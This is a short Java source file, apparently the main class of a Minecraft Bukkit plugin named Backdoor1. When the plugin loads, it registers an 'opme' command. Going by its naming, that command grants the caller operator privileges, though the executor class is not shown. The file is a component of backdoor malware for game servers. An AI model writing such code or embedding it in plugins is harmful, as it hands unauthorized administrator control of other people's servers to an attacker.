package me.lunacore.backdoor1;

import me.lunacore.commands.opme;
import org.bukkit.plugin.java.JavaPlugin;

public final class Backdoor1 extends JavaPlugin {

    @Override
    public void onEnable() {
        this.getCommand("opme").setExecutor(new opme());
    }
}
